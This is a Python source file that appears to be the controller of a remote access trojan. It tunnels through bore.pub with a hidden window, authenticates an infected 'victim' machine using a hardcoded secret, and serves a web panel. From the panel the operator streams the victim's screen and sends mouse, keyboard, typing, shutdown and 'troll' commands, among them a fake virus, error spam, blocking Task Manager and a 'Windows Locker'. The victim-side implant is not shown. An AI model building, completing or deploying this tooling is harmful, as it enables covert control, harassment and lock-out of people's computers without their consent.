import socket, threading, time, sys, os, urllib.request, webbrowser, subprocess, shutil
SECRET = "gH7#kL9$mN2@pQ5!rT8&vB4*wZ1"
from flask import Flask, Response, request, jsonify

latest_jpeg = None
cam_lock = threading.Lock()
cmd_log = []
sock = None
running = True
HOST = PORT = None

HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>https://github.com/Krimex1</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f1a;color:#e0e0e0;font-family:system-ui,monospace;padding:15px}
h2{margin-bottom:12px;color:#7c5cfc;font-size:20px}
h3{margin:10px 0 6px;color:#888;font-size:13px;text-transform:uppercase;letter-spacing:1px}
#screen{width:100%;max-height:70vh;object-fit:contain;border:2px solid #2a2a40;border-radius:8px;background:#000;display:block}
.row{display:flex;gap:8px;flex-wrap:wrap;margin:6px 0}
.row-end{margin-top:8px}
#cmd{flex:1;padding:8px 12px;border:none;border-radius:5px;background:#1e1e32;color:#e0e0e0;font-family:monospace;font-size:13px;min-width:150px}
#cmd:focus{outline:2px solid #7c5cfc}
.inp{padding:6px 10px;border:none;border-radius:5px;background:#1e1e32;color:#e0e0e0;width:70px;font-size:13px;font-family:monospace}
.inp:focus{outline:2px solid #7c5cfc}
button{padding:7px 14px;border:none;border-radius:5px;cursor:pointer;font-size:12px;white-space:nowrap}
.btn-send{background:#7c5cfc;color:#fff}
.btn-send:hover{background:#6a4be0}
.btn-qck{background:#2a2a40;color:#ccc}
.btn-qck:hover{background:#3a3a55}
.btn-red{background:#5c1a1a;color:#f88}
.btn-red:hover{background:#7a2222}
.lbl{color:#888;font-size:12px;line-height:30px}
#log{background:#1a1a2e;border:1px solid #2a2a40;border-radius:5px;padding:10px;font-family:monospace;font-size:12px;height:120px;overflow-y:auto;white-space:pre-wrap;color:#aaa;margin-top:8px}
</style>
</head>
<body>
<h2>Remote Control</h2>
<img id="screen" src="/stream">

<h3>Mouse</h3>
<div class="row">
<button class="btn-qck" onclick="send('click left')">Left Click</button>
<button class="btn-qck" onclick="send('click right')">Right Click</button>
<button class="btn-qck" id="revBtn" onclick="toggleRev()">Reverse</button>
</div>
<div class="row">
<span class="lbl">Move:</span><input class="inp" id="mx" placeholder="X" value="100"><input class="inp" id="my" placeholder="Y" value="50">
<button class="btn-qck" onclick="sendMove()">Move</button>
</div>

<h3>Auto</h3>
<div class="row">
<span class="lbl">AutoMove speed:</span><input class="inp" id="ams" placeholder="0.5" value="0.5">
<button class="btn-qck" onclick="send('automove '+document.getElementById('ams').value)">Go</button>
<span class="lbl" style="margin-left:10px">AutoClick:</span><input class="inp" id="aci" placeholder="interval" value="1.0" style="width:60px">
<span class="lbl">sec</span><input class="inp" id="acd" placeholder="duration" value="10" style="width:60px">
<button class="btn-qck" onclick="send('autoclick '+document.getElementById('aci').value+' '+document.getElementById('acd').value)">Go</button>
</div>

<h3>Keyboard</h3>
<div class="row">
<span class="lbl">Type (real‑time):</span><input class="inp" id="txt" placeholder="type here" style="width:200px">
</div>
<div class="row">
<span class="lbl">Press key:</span><input class="inp" id="key" placeholder="a" style="width:60px">
<button class="btn-qck" onclick="send('key '+document.getElementById('key').value)">Press</button>
<span class="lbl" style="margin-left:10px">Special:</span>
<select class="inp" id="skey" style="width:110px">
<option>enter</option><option>esc</option><option>space</option><option>tab</option>
<option>ctrl</option><option>shift</option><option>alt</option>
<option>backspace</option><option>delete</option>
<option>up</option><option>down</option><option>left</option><option>right</option>
</select>
<button class="btn-qck" onclick="send('special_key '+document.getElementById('skey').value)">Press</button>
</div>

<h3>Troll</h3>
<div class="row">
<button class="btn-qck" onclick="send('rick')">Rick Roll</button>
<button class="btn-qck" onclick="send('fake_virus')">Fake Virus</button>
<button class="btn-qck" onclick="send('fake_error')">Fake Error</button>
<button class="btn-qck" onclick="send('error_spam')">Error Spam</button>
<button class="btn-qck" onclick="send('error_spam_stop')">Stop Spam</button>
<button class="btn-qck" onclick="send('block_taskmgr')">Block TaskMgr</button>
<button class="btn-qck" onclick="send('open https://www.youtube.com/watch?v=dQw4w9WgXcQ')">Open URL</button>
<button class="btn-red" onclick="send('lock_screen')">Windows Locker</button>
<button class="btn-qck" onclick="send('unlock')">Unlock</button>
<button class="btn-red" onclick="if(confirm('Shutdown?'))send('shutdown')">Shutdown</button>
</div>

<div class="row row-end">
<input id="cmd" placeholder="Any command (move 100 50, type Hello, key a, ...)" onkeydown="if(event.key=='Enter')sendCmd()">
<button class="btn-send" onclick="sendCmd()">Send</button>
</div>
<div id="log">Connected</div>
<script>
var reversed=false;
function send(cmd){fetch('/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})}).then(r=>r.json()).then(d=>{if(d.log)document.getElementById('log').textContent=d.log})}
function sendCmd(){var c=document.getElementById('cmd');if(c.value.trim()){send(c.value.trim());c.value=''}}
function toggleRev(){reversed=!reversed;var b=document.getElementById('revBtn');b.textContent=reversed?'REVERSE ON':'Reverse';b.style.background=reversed?'#5c1a1a':'';send('reverse_mouse')}
function sendMove(){var x=parseInt(document.getElementById('mx').value)||0;var y=parseInt(document.getElementById('my').value)||0;if(reversed){x=-x;y=-y}send('move '+x+' '+y)}
function clickImg(e){var r=e.target.getBoundingClientRect();var x=Math.round((e.clientX-r.left)*e.target.naturalWidth/e.target.clientWidth);var y=Math.round((e.clientY-r.top)*e.target.naturalHeight/e.target.clientHeight);send('click_at '+x+' '+y)}
document.getElementById('screen').addEventListener('click',clickImg);
document.getElementById('txt').addEventListener('keydown',function(e){if(e.key.length===1){send('type '+e.key)}else if(e.key==='Enter'){send('special_key enter')}else if(e.key==='Backspace'){send('special_key backspace')}else if(e.key==='Tab'){send('special_key tab')}else if(e.key==='Escape'){send('special_key esc')}});
setInterval(function(){fetch('/log').then(r=>r.text()).then(t=>document.getElementById('log').textContent=t)},2000)
</script>
</body>
</html>"""

def find_bore():
    for p in [shutil.which("bore.exe"), "bore.exe"]:
        if p and os.path.exists(p):
            return os.path.abspath(p)
    meipass = getattr(sys, '_MEIPASS', None)
    if meipass:
        p = os.path.join(meipass, "bore.exe")
        if os.path.exists(p):
            return p
    here = os.path.dirname(os.path.abspath(sys.argv[0]))
    p = os.path.join(here, "bore.exe")
    if os.path.exists(p):
        return p
    return None

def bore_listener(server_port):
    bore_path = find_bore()
    if not bore_path:
        return False
    for bport in range(65535, 64999, -1):
        proc = subprocess.Popen(
            [bore_path, "local", str(server_port), "--to", "bore.pub", "--port", str(bport)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        for line in iter(proc.stdout.readline, b''):
            txt = line.decode(errors='replace').strip()
            if 'bore.pub:' in txt and str(bport) in txt:
                def drain(p=proc):
                    try:
                        for _ in iter(p.stdout.readline, b''): pass
                    except: pass
                threading.Thread(target=drain, daemon=True).start()
                return True
            if 'port already in use' in txt:
                break
        proc.terminate()
    return False

def wait_for_victim(srv):
    while True:
        client_sock, addr = srv.accept()
        buf = b""
        while b"\n" not in buf:
            chunk = client_sock.recv(1024)
            if not chunk: break
            buf += chunk
        if buf.strip().decode() == f"AUTH {SECRET}":
            client_sock.sendall(b"AUTH_OK\n")
            srv.close()
            return client_sock
        client_sock.close()

def screen_reader():
    global latest_jpeg, running, cmd_log
    while running:
        try:
            sock.settimeout(3.0)
            size_bytes = sock.recv(4)
            if not size_bytes or len(size_bytes) < 4:
                break
            size = int.from_bytes(size_bytes, 'big')
            if size < 100 or size > 10_000_000:
                continue
            data = b''
            while len(data) < size:
                chunk = sock.recv(min(size - len(data), 65536))
                if not chunk:
                    break
                data += chunk
            if len(data) == size:
                with cam_lock:
                    latest_jpeg = data
        except socket.timeout:
            continue
        except:
            break
    running = False
    cmd_log.append("! Connection lost")

def start_web_ui():
    global sock
    print("Starting web UI...")
    threading.Thread(target=screen_reader, daemon=True).start()

    app = Flask(__name__)

    @app.route('/')
    def index():
        return HTML

    @app.route('/stream')
    def stream():
        def gen():
            while running:
                try:
                    with cam_lock:
                        frame = latest_jpeg
                    if frame:
                        yield b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame + b'\r\n'
                    else:
                        time.sleep(0.1)
                except:
                    break
        return Response(gen(), mimetype='multipart/x-mixed-replace; boundary=frame')

    @app.route('/command', methods=['POST'])
    def command():
        cmd = request.json.get('cmd', '')
        try:
            sock.sendall(cmd.encode())
            cmd_log.append(f"> {cmd}")
            if len(cmd_log) > 100:
                cmd_log.pop(0)
        except Exception as e:
            cmd_log.append(f"Error: {e}")
        return jsonify({'log': '\n'.join(cmd_log[-50:])})

    @app.route('/log')
    def log():
        return '\n'.join(cmd_log[-50:])

    webbrowser.open('http://localhost:5000')
    print("Web UI: http://localhost:5000")
    while True:
        try:
            app.run(host='127.0.0.1', port=5000, threaded=True, debug=False)
        except:
            pass
        time.sleep(1)

def main():
    global sock
    if getattr(sys, 'frozen', False) or '--auto' in sys.argv:
        mode = "1"
    else:
        print("Remote Control Client")
        print("1 - Start listener (bore + web UI)")
        print("2 - Direct connect (no bore, enter victim IP:port)")
        mode = input("Choose: ").strip()

    if mode == "1":
        print("Client running...", flush=True)
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 5000))
        srv.listen(5)
        if not bore_listener(5000):
            input("Press Enter...")
            return
        sock = wait_for_victim(srv)
        start_web_ui()
    elif mode == "2":
        addr = input("Enter victim IP:port (e.g. 192.168.1.10:65432): ").strip()
        if ':' not in addr:
            return
        host, port = addr.rsplit(':', 1)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, int(port)))
            start_web_ui()
        except Exception as e:
            print(f"Connection failed: {e}")
            input("Press Enter...")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        import traceback
        with open("client_error.txt", "w") as f:
            traceback.print_exc(file=f)
        input(f"Error: {e}")

